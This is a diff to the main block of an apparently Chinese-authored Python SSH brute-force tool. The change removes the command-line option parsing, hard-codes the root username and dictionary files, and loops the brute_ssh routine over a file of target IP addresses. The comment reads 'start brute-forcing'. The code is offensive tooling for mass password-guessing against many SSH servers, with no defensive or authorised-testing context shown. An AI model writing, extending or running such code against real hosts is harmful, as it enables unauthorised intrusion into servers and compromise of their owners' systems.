@@ -108,34 +108,36 @@ def xhelp():
 
 
 if __name__ == '__main__':
-    logo()
-    hostname = ''
+    # logo()
+    # hostname = ''
     port = 22
     username = 'root'
     password = ''
-    username_list = ''
-    password_list = ''
-    try:
-        for argv in sys.argv:
-            if argv.lower() == "-t" or argv.lower() == "--target":
-                hostname = sys.argv[sys.argv.index(argv) + 1]
-            elif argv.lower() == "-po" or argv.lower() == "--port":
-                port = int(sys.argv[sys.argv.index(argv) + 1])
-            elif argv.lower() == "-u" or argv.lower() == "--username":
-                username = sys.argv[sys.argv.index(argv) + 1]
-            elif argv.lower() == "-p" or argv.lower() == "--password":
-                password = sys.argv[sys.argv.index(argv) + 1]
-            elif argv.lower() == "-ul" or argv.lower() == "--username_list":
-                username_list = sys.argv[sys.argv.index(argv) + 1]
-            elif argv.lower() == "-pl" or argv.lower() == "--password_list":
-                password_list = sys.argv[sys.argv.index(argv) + 1]
-            elif argv.lower() == "-h" or argv.lower() == "--help":
-                xhelp()
-    except SystemExit:
-        print("[!] Cheak your parametars input")
-        sys.exit(0)
-    except Exception:
-        xhelp()
+    username_list = '../ssh_fuce_dict1.txt'
+    password_list = '../ssh_fuce_dict1.txt'
+    # try:
+    #     for argv in sys.argv:
+    #         if argv.lower() == "-t" or argv.lower() == "--target":
+    #             hostname = sys.argv[sys.argv.index(argv) + 1]
+    #         elif argv.lower() == "-po" or argv.lower() == "--port":
+    #             port = int(sys.argv[sys.argv.index(argv) + 1])
+    #         elif argv.lower() == "-u" or argv.lower() == "--username":
+    #             username = sys.argv[sys.argv.index(argv) + 1]
+    #         elif argv.lower() == "-p" or argv.lower() == "--password":
+    #             password = sys.argv[sys.argv.index(argv) + 1]
+    #         elif argv.lower() == "-ul" or argv.lower() == "--username_list":
+    #             username_list = sys.argv[sys.argv.index(argv) + 1]
+    #         elif argv.lower() == "-pl" or argv.lower() == "--password_list":
+    #             password_list = sys.argv[sys.argv.index(argv) + 1]
+    #         elif argv.lower() == "-h" or argv.lower() == "--help":
+    #             xhelp()
+    # except SystemExit:
+    #     print("[!] Cheak your parametars input")
+    #     sys.exit(0)
+    # except Exception:
+    #     xhelp()
 
     # 开始爆破
-    brute_ssh(hostname=hostname, port=port, username=username, password=password, password_list=password_list)
+    ssh_ips = load_file("../ssh_fuce_ip1.txt")
+    for hostname in ssh_ips:
+        brute_ssh(hostname=hostname, port=port, username=username, password=password, password_list=password_list)
